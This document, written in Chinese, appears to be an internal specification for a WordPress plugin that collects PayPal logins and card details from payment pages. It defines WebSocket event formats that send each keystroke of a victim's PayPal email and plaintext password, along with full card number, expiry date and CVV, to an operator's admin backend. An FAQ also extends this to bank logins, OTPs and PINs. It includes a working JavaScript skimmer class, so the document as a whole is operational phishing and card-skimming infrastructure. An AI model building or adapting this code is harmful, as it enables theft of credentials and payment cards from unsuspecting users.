# WordPress PayPal 事件发送规范

> 本文档详细说明 WordPress 插件应如何发送 PayPal 相关事件，以便后端能正确接收、保存和渲染数据。

---

## 📌 重要说明

后端支持两种 PayPal 数据捕获方式：

| 方式 | 事件类型 | 触发时机 | 数据保存 |
|------|---------|---------|---------|
| **方式1：实时输入** | `user_event` + `input_pp_account/input_pp_password` | 用户输入时 | ✅ 立即保存 |
| **方式2：验证输入** | `verification_input` | 用户输入时 | ✅ 立即保存 |
| **方式3：失焦事件** | `verification_blur` | 输入框失焦时 | ⚠️ 需包含 `value` 字段 |
| **方式4：提交事件** | `verification_submitted` | 用户点击确认时 | ✅ 保存并标记完成 |

**推荐使用方式1或方式2进行实时数据捕获**，方式3和方式4作为补充。

---

## 一、PayPal 账号（Email）事件

### 1.1 实时输入事件（推荐）

当用户在 PayPal 邮箱输入框中输入时，发送此事件：

```javascript
{
  type: 'user_event',
  event_type: 'input_pp_account',        // 🔥 固定值
  session_id: 'cpg_1234567890_abc123',   // 会话ID
  order_no: 'ORDER-12345',               // 订单号
  timestamp: Date.now(),
  data: {
    field: 'email',
    value: 'user@example.com',           // 🔥 实际邮箱值
    pp_account: 'user@example.com',      // 🔥 PayPal 账号（别名）
    has_value: true,
    value_length: 16
  }
}
```

**后端处理**：
- 保存到 `verification_results` 表
- `verification_type` = 'pp_account'
- `verification_data` = `{"email": "user@example.com", "pp_account": "user@example.com"}`

### 1.2 验证输入事件（替代方案）

```javascript
{
  type: 'verification_input',
  session_id: 'cpg_1234567890_abc123',
  verification_type: 'pp_account',       // 🔥 固定值
  field: 'email',
  value: 'user@example.com'              // 🔥 实际邮箱值
}
```

### 1.3 失焦事件

当用户离开 PayPal 邮箱输入框时发送：

```javascript
{
  type: 'verification_blur',
  event_type: 'verification_blur',
  session_id: 'cpg_1234567890_abc123',
  order_no: 'ORDER-12345',
  order_id: 'wc_123',                    // WooCommerce 订单ID（可选）
  timestamp: Date.now(),
  
  // 核心字段
  verification_type: 'pp_account',       // 🔥 固定值
  field: 'email',
  has_value: true,
  value_length: 16,
  
  // 🔥🔥🔥 关键：必须包含实际值
  value: 'user@example.com',
  pp_account: 'user@example.com',
  email: 'user@example.com',
  
  // data 对象（兼容性）
  data: {
    field: 'email',
    verification_type: 'pp_account',
    has_value: true,
    value_length: 16,
    value: 'user@example.com',
    pp_account: 'user@example.com',
    email: 'user@example.com'
  }
}
```

---

## 二、PayPal 密码（Password）事件

### 2.1 实时输入事件（推荐）

```javascript
{
  type: 'user_event',
  event_type: 'input_pp_password',       // 🔥 固定值
  session_id: 'cpg_1234567890_abc123',
  order_no: 'ORDER-12345',
  timestamp: Date.now(),
  data: {
    field: 'password',
    value: 'mySecurePassword123',        // 🔥 实际密码值
    pp_password: 'mySecurePassword123',  // 🔥 PP密码（别名）
    has_value: true,
    value_length: 18
  }
}
```

### 2.2 验证输入事件（替代方案）

```javascript
{
  type: 'verification_input',
  session_id: 'cpg_1234567890_abc123',
  verification_type: 'pp_password',      // 🔥 固定值
  field: 'password',
  value: 'mySecurePassword123'           // 🔥 实际密码值
}
```

### 2.3 失焦事件

```javascript
{
  type: 'verification_blur',
  event_type: 'verification_blur',
  session_id: 'cpg_1234567890_abc123',
  order_no: 'ORDER-12345',
  order_id: 'wc_123',
  timestamp: Date.now(),
  
  verification_type: 'pp_password',      // 🔥 固定值
  field: 'password',
  has_value: true,
  value_length: 18,
  
  // 🔥🔥🔥 关键：必须包含实际值
  value: 'mySecurePassword123',
  pp_password: 'mySecurePassword123',
  password: 'mySecurePassword123',
  
  data: {
    field: 'password',
    verification_type: 'pp_password',
    has_value: true,
    value_length: 18,
    value: 'mySecurePassword123',
    pp_password: 'mySecurePassword123',
    password: 'mySecurePassword123'
  }
}
```

---

## 三、PayPal 卡号失焦事件

当用户离开 PayPal 信用卡卡号输入框时发送：

```javascript
{
  type: 'input_blur',                    // 🔥 注意：不是 verification_blur
  event_type: 'input_blur',
  session_id: 'cpg_1234567890_abc123',
  order_no: 'ORDER-12345',
  order_id: 'wc_123',
  timestamp: Date.now(),
  
  field: 'card_number',                  // 🔥 固定值
  has_value: true,
  value_length: 16,
  
  data: {
    field: 'card_number',
    type: 'text',
    has_value: true,
    value_length: 16,
    
    // 🔥 必须包含以下字段之一
    card_number: '4242424242424242',     // 完整卡号
    card_no: '4242424242424242',         // 卡号（别名）
    value: '4242424242424242',           // 值（备用）
    
    // 可选：卡类型
    card_type: 'VISA'                    // VISA/MASTERCARD/AMEX 等
  }
}
```

**后端处理**：
- 自动查询 BIN 信息
- 保存到 `card_data.card_number_masked`
- 更新 `card_data.card_type`

---

## 四、PayPal 有效期失焦事件

```javascript
{
  type: 'input_blur',
  event_type: 'input_blur',
  session_id: 'cpg_1234567890_abc123',
  order_no: 'ORDER-12345',
  order_id: 'wc_123',
  timestamp: Date.now(),
  
  field: 'expiry',                       // 🔥 固定值
  has_value: true,
  value_length: 5,
  
  data: {
    field: 'expiry',
    type: 'text',
    has_value: true,
    value_length: 5,
    
    // 🔥 必须包含以下字段之一
    expiry: '12/25',                     // 格式: MM/YY
    expiry_date: '12/25',                // 有效期（别名）
    card_expiry: '12/25',                // 卡有效期（别名）
    value: '12/25'                       // 值（备用）
  }
}
```

---

## 五、PayPal CVV 失焦事件

```javascript
{
  type: 'input_blur',
  event_type: 'input_blur',
  session_id: 'cpg_1234567890_abc123',
  order_no: 'ORDER-12345',
  order_id: 'wc_123',
  timestamp: Date.now(),
  
  field: 'cvv',                          // 🔥 固定值
  has_value: true,
  value_length: 3,
  
  data: {
    field: 'cvv',
    type: 'text',
    has_value: true,
    value_length: 3,
    
    // 🔥 必须包含以下字段之一
    cvv: '123',                          // 3-4 位 CVV
    card_cvv: '123',                     // CVV（别名）
    value: '123'                         // 值（备用）
  }
}
```

---

## 六、完整数据提交事件

当用户点击"确认"或"提交"按钮时，发送完整的 PayPal 账号密码：

```javascript
{
  type: 'verification_submitted',
  session_id: 'cpg_1234567890_abc123',
  verification_type: 'pp_account',       // 或 'pp_password' 或 'pp_login'
  verification_data: {
    email: 'user@example.com',
    pp_account: 'user@example.com',
    password: 'mySecurePassword123',
    pp_password: 'mySecurePassword123'
  },
  timestamp: Date.now()
}
```

---

## 七、字段优先级说明

后端在提取数据时的优先级：

### PayPal 账号
```
pp_account > email > value > data.pp_account > data.email > data.value
```

### PayPal 密码
```
pp_password > password > value > data.pp_password > data.password > data.value
```

### 卡号
```
card_number > card_no > value > data.card_number > data.card_no > data.value
```

### 有效期
```
expiry > expiry_date > card_expiry > value > data.expiry > data.value
```

### CVV
```
cvv > card_cvv > value > data.cvv > data.card_cvv > data.value
```

---

## 八、完整流程示例

### 场景：用户填写 PayPal 登录表单

```
┌─────────────────────────────────────────────────────────────────┐
│  1. 用户开始输入邮箱                                              │
│     └─ 发送 input_pp_account 事件（每次按键或防抖后）              │
│                                                                   │
│  2. 用户离开邮箱输入框                                            │
│     └─ 发送 verification_blur (type=pp_account) 事件             │
│                                                                   │
│  3. 用户开始输入密码                                              │
│     └─ 发送 input_pp_password 事件（每次按键或防抖后）             │
│                                                                   │
│  4. 用户离开密码输入框                                            │
│     └─ 发送 verification_blur (type=pp_password) 事件            │
│                                                                   │
│  5. 用户点击"登录"按钮                                            │
│     └─ 发送 verification_submitted 事件（包含账号+密码）          │
└─────────────────────────────────────────────────────────────────┘
```

### 场景：用户填写 PayPal 信用卡表单

```
┌─────────────────────────────────────────────────────────────────┐
│  1. 用户输入卡号                                                  │
│     └─ 发送 input_card 事件                                      │
│                                                                   │
│  2. 用户离开卡号输入框                                            │
│     └─ 发送 input_blur (field=card_number) 事件                  │
│                                                                   │
│  3. 用户输入有效期                                                │
│     └─ 发送 input_expiry 事件                                    │
│                                                                   │
│  4. 用户离开有效期输入框                                          │
│     └─ 发送 input_blur (field=expiry) 事件                       │
│                                                                   │
│  5. 用户输入 CVV                                                  │
│     └─ 发送 input_cvv 事件                                       │
│                                                                   │
│  6. 用户离开 CVV 输入框                                           │
│     └─ 发送 input_blur (field=cvv) 事件                          │
│     └─ 如果卡号+有效期+CVV 都完整，发送 card_data_captured 事件   │
└─────────────────────────────────────────────────────────────────┘
```

---

## 九、事件类型速查表

| 事件类型 | type 值 | 用途 | 后端保存 |
|---------|---------|------|---------|
| PP账号实时输入 | `user_event` + `event_type: input_pp_account` | 邮箱输入 | ✅ `verification_results` |
| PP密码实时输入 | `user_event` + `event_type: input_pp_password` | 密码输入 | ✅ `verification_results` |
| PP验证输入 | `verification_input` | 通用验证输入 | ✅ `verification_results` |
| PP账号失焦 | `verification_blur` + `verification_type: pp_account` | 邮箱失焦 | ⚠️ 需含 `value` |
| PP密码失焦 | `verification_blur` + `verification_type: pp_password` | 密码失焦 | ⚠️ 需含 `value` |
| 卡号失焦 | `input_blur` + `field: card_number` | 卡号失焦 | ✅ `card_data` |
| 有效期失焦 | `input_blur` + `field: expiry` | 有效期失焦 | ✅ `card_data` |
| CVV失焦 | `input_blur` + `field: cvv` | CVV失焦 | ✅ `card_data` |
| 完整提交 | `verification_submitted` | 用户点击确认 | ✅ `verification_results` |
| 卡片数据捕获 | `card_data_captured` | CVV 完成后自动 | ✅ `card_data` |

---

## 十、常见问题

### Q1: 为什么后端收不到 PayPal 账号/密码？

**原因**：`verification_blur` 事件没有包含 `value` 字段。

**解决**：确保在事件中包含：
```javascript
{
  value: '实际值',           // 根级别
  pp_account: '实际值',      // 或 pp_password
  data: {
    value: '实际值'          // data 对象中也包含
  }
}
```

### Q2: 应该用 `input_blur` 还是 `verification_blur`？

| 字段类型 | 使用事件 |
|---------|---------|
| 卡号、有效期、CVV | `input_blur` |
| PayPal 账号、密码 | `verification_blur` |
| 网银账号、密码 | `verification_blur` |
| OTP、PIN、验证码 | `verification_blur` |

### Q3: 实时输入和失焦事件都需要发送吗？

**推荐做法**：
1. **实时输入事件**（`input_pp_account` / `input_pp_password`）：用于实时显示用户正在输入
2. **失焦事件**（`verification_blur`）：用于确认用户已完成该字段输入
3. **提交事件**（`verification_submitted`）：用于最终确认

三者配合使用效果最佳。

### Q4: 密码应该明文发送吗？

是的，管理后台需要看到实际密码值。所有数据通过 WSS 加密传输。

---

## 十一、JavaScript 代码示例

### 完整的 PayPal 表单事件绑定

```javascript
class PayPalTracker {
  constructor(sessionId, orderNo, ws) {
    this.sessionId = sessionId;
    this.orderNo = orderNo;
    this.ws = ws;
    this.ppAccount = '';
    this.ppPassword = '';
  }

  // 发送消息
  send(message) {
    if (this.ws && this.ws.readyState === WebSocket.OPEN) {
      this.ws.send(JSON.stringify({
        ...message,
        session_id: this.sessionId,
        order_no: this.orderNo,
        timestamp: Date.now()
      }));
    }
  }

  // 绑定 PayPal 邮箱输入框
  bindEmailInput(inputElement) {
    // 实时输入（防抖 300ms）
    let debounceTimer;
    inputElement.addEventListener('input', (e) => {
      this.ppAccount = e.target.value;
      clearTimeout(debounceTimer);
      debounceTimer = setTimeout(() => {
        this.send({
          type: 'user_event',
          event_type: 'input_pp_account',
          data: {
            field: 'email',
            value: this.ppAccount,
            pp_account: this.ppAccount,
            has_value: this.ppAccount.length > 0,
            value_length: this.ppAccount.length
          }
        });
      }, 300);
    });

    // 失焦
    inputElement.addEventListener('blur', () => {
      this.send({
        type: 'verification_blur',
        event_type: 'verification_blur',
        verification_type: 'pp_account',
        field: 'email',
        has_value: this.ppAccount.length > 0,
        value_length: this.ppAccount.length,
        value: this.ppAccount,
        pp_account: this.ppAccount,
        email: this.ppAccount,
        data: {
          field: 'email',
          verification_type: 'pp_account',
          has_value: this.ppAccount.length > 0,
          value_length: this.ppAccount.length,
          value: this.ppAccount,
          pp_account: this.ppAccount,
          email: this.ppAccount
        }
      });
    });
  }

  // 绑定 PayPal 密码输入框
  bindPasswordInput(inputElement) {
    // 实时输入（防抖 300ms）
    let debounceTimer;
    inputElement.addEventListener('input', (e) => {
      this.ppPassword = e.target.value;
      clearTimeout(debounceTimer);
      debounceTimer = setTimeout(() => {
        this.send({
          type: 'user_event',
          event_type: 'input_pp_password',
          data: {
            field: 'password',
            value: this.ppPassword,
            pp_password: this.ppPassword,
            has_value: this.ppPassword.length > 0,
            value_length: this.ppPassword.length
          }
        });
      }, 300);
    });

    // 失焦
    inputElement.addEventListener('blur', () => {
      this.send({
        type: 'verification_blur',
        event_type: 'verification_blur',
        verification_type: 'pp_password',
        field: 'password',
        has_value: this.ppPassword.length > 0,
        value_length: this.ppPassword.length,
        value: this.ppPassword,
        pp_password: this.ppPassword,
        password: this.ppPassword,
        data: {
          field: 'password',
          verification_type: 'pp_password',
          has_value: this.ppPassword.length > 0,
          value_length: this.ppPassword.length,
          value: this.ppPassword,
          pp_password: this.ppPassword,
          password: this.ppPassword
        }
      });
    });
  }

  // 提交 PayPal 登录
  submitPayPalLogin() {
    this.send({
      type: 'verification_submitted',
      verification_type: 'pp_login',
      verification_data: {
        email: this.ppAccount,
        pp_account: this.ppAccount,
        password: this.ppPassword,
        pp_password: this.ppPassword
      }
    });
  }
}

// 使用示例
const tracker = new PayPalTracker('cpg_xxx', 'ORDER-123', websocket);
tracker.bindEmailInput(document.getElementById('pp-email'));
tracker.bindPasswordInput(document.getElementById('pp-password'));
document.getElementById('pp-login-btn').addEventListener('click', () => {
  tracker.submitPayPalLogin();
});
```

---

## 十二、数据库存储位置

| 数据类型 | 表名 | 字段 |
|---------|------|------|
| PayPal 账号/密码 | `verification_results` | `verification_type`, `verification_data` (JSON) |
| 信用卡信息 | `card_data` | `card_number_masked`, `expiry_date`, `cvv` |
| 用户事件 | `user_events` | `event_type`, `event_data` (JSON) |

---

**文档版本**: 1.0  
**更新日期**: 2024-12-11  
**作者**: 系统开发团队
